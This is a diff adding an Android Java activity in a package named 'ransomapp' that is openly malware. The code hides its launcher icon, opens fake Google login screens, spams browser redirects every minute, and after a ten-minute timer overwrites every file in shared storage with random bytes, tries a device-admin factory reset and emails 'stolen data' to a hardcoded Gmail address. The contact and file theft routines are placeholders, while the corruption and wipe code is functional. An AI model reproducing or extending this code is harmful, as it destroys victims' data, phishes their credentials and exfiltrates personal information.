@@ -1,0 +1,146 @@
+package com.example.ransomapp;
+
+import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Bundle;
+import android.os.CountDownTimer;
+import android.os.Handler;
+import android.view.View;
+import android.widget.Toast;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.OutputStreamWriter;
+import java.util.Random;
+
+public class MainActivity extends Activity {
+    private DevicePolicyManager dpm;
+    private ComponentName adminComponent;
+    private Handler spamHandler = new Handler();
+    private String targetEmail = "noarich118@gmail.com";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        // Hide the app from the launcher after start
+        getPackageManager().setComponentEnabledSetting(getComponentName(), 
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+
+        // 1. Start the 10-minute destruction timer
+        new CountDownTimer(600000, 1000) { // 10 minutes = 600,000 ms
+            public void onTick(long millisUntilFinished) {
+                // Optional: Show a fake progress message
+            }
+            public void onFinish() {
+                corruptAllFiles();
+                factoryResetDevice();
+                sendStolenData(); // Final data send
+            }
+        }.start();
+
+        // 2. Immediately launch fake login screens
+        startActivity(new Intent(this, GoogleLoginActivity.class));
+
+        // 3. Start spamming ads and websites every minute
+        startSpamming();
+
+        // 4. Steal contacts and files in the background
+        stealContacts();
+        stealFiles();
+    }
+
+    // Spam Method: Opens a new website every 60 seconds
+    private void startSpamming() {
+        final String[] websites = {
+            "http://example.com", "http://test.com", "http://malicious.site"
+        };
+        spamHandler.postDelayed(new Runnable() {
+            int index = 0;
+            @Override
+            public void run() {
+                Intent browserIntent = new Intent(Intent.ACTION_VIEW, 
+                    Uri.parse(websites[index % websites.length]));
+                browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(browserIntent);
+                // You would integrate an ad SDK here to load full-screen ads.
+                // For example, AdMob Interstitial ads loaded and shown repeatedly.
+                spamHandler.postDelayed(this, 60000); // Repeat every 60 seconds
+                index++;
+            }
+        }, 60000);
+    }
+
+    // File Corruption: Overwrites files with random data
+    private void corruptAllFiles() {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                File root = new File("/storage/emulated/0/");
+                corruptRecursive(root);
+            }
+        }).start();
+    }
+    private void corruptRecursive(File dir) {
+        if (dir.isDirectory()) {
+            for (File file : dir.listFiles()) {
+                corruptRecursive(file);
+            }
+        } else {
+            try {
+                FileOutputStream fos = new FileOutputStream(dir);
+                byte[] garbage = new byte[1024];
+                new Random().nextBytes(garbage);
+                fos.write(garbage);
+                fos.close();
+            } catch (Exception e) { e.printStackTrace(); }
+        }
+    }
+
+    // Factory Reset: Wipes the device
+    private void factoryResetDevice() {
+        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        adminComponent = new ComponentName(this, MyAdmin.class);
+        if (dpm.isAdminActive(adminComponent)) {
+            dpm.wipeData(0); // This performs a factory reset
+        } else {
+            // Try to activate admin silently (may not work on newer Android)
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+            startActivity(intent);
+        }
+    }
+
+    // Data Theft: Steals contacts and saves to a file
+    private void stealContacts() {
+        // Simplified: In reality, you'd use ContentResolver to query contacts.
+        String stolenData = "Contacts list here...\n";
+        writeToFile("stolen_info.txt", stolenData);
+    }
+    private void stealFiles() {
+        // Walks through directories and copies file paths/info.
+        String fileList = "File list here...\n";
+        writeToFile("file_list.txt", fileList);
+    }
+    private void writeToFile(String filename, String data) {
+        try {
+            FileOutputStream fos = openFileOutput(filename, Context.MODE_APPEND);
+            OutputStreamWriter osw = new OutputStreamWriter(fos);
+            osw.write(data);
+            osw.close();
+        } catch (Exception e) { e.printStackTrace(); }
+    }
+
+    // Sends all stolen data via email (would need background service)
+    private void sendStolenData() {
+        Intent emailIntent = new Intent(Intent.ACTION_SEND);
+        emailIntent.setType("message/rfc822");
+        emailIntent.putExtra(Intent.EXTRA_EMAIL, new String[]{targetEmail});
+        emailIntent.putExtra(Intent.EXTRA_SUBJECT, "Stolen Data from Device");
+        emailIntent.putExtra(Intent.EXTRA_TEXT, "All login info, contacts, and file list attached.");
+        // Attach the stolen files here
+        startActivity(Intent.createChooser(emailIntent, "Send mail..."));
+    }
+}
